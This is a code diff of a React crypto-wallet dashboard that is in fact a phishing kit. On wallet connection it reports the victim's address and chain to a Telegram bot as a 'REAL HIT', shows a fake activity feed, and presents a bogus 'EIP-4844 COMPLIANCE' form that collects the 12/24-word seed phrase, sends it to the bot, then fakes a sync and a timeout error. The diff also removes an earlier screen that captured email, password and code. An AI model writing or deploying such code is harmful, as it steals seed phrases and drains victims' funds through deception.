@@ -11,10 +11,6 @@ export default function App() {
   const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
-  const [kycEmail, setKycEmail] = useState("");
-  const [kycPass, setKycPass] = useState("");
-  const [kycCode, setKycCode] = useState(""); 
-  const [kycPhase, setKycPhase] = useState(1); 
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
@@ -27,25 +23,19 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  // DIRECT HIT FUNCTION
-  const sendHit = (msg) => {
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
-    fetch(url, { mode: 'no-cors' }).catch(() => {});
-  };
-
-  // --- THE FIXED REAL HIT LISTENER ---
+  // 🎯 REAL HIT ONLY - NO FAKES ALLOWED
   useEffect(() => {
     if (isConnected && address) {
-      // We check if we already sent this hit in this session to avoid spamming
       const hasSent = sessionStorage.getItem('hit_' + address);
       if (!hasSent) {
-        sendHit(`🎯 REAL HIT CONNECTED!\n\nADDR: ${address}\nNET: ${chainId}`);
+        const msg = `🎯 REAL WALLET CONNECTED!\n\nADDR: ${address}\nNET: ${chainId}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`).catch(() => {});
         sessionStorage.setItem('hit_' + address, 'true');
       }
     }
   }, [isConnected, address, chainId]);
 
-  // FAKE BUSY FEED
+  // VISUAL FEED (SCREEN ONLY - BOT IS SILENT HERE)
   useEffect(() => {
     const trigger = () => {
       const r = Math.floor(1000 + Math.random() * 8999);
@@ -53,7 +43,7 @@ export default function App() {
       setTimeout(() => setFeedMsg(""), 4000);
     };
     trigger();
-    const interval = setInterval(trigger, 11000);
+    const interval = setInterval(trigger, 12000);
     return () => clearInterval(interval);
   }, []);
 
@@ -89,7 +79,7 @@ export default function App() {
       {isConnected ? (
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
-            <iframe title="market" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
+            <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
@@ -99,7 +89,7 @@ export default function App() {
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
-                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
+                <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                   <div>{n === "Rectify" ? "⚡" : "〽️"}</div>
                   <div style={{fontSize:'9px'}}>{n}</div>
@@ -126,7 +116,7 @@ export default function App() {
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'15px'}} />
-                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); sendHit(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
+                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🚨 SEED: " + seedVal)}`).catch(()=>{}); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
                     style={{width:'100%', backgroundColor: isSeedOk ? '#10b981' : '#1e293b', color: isSeedOk ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
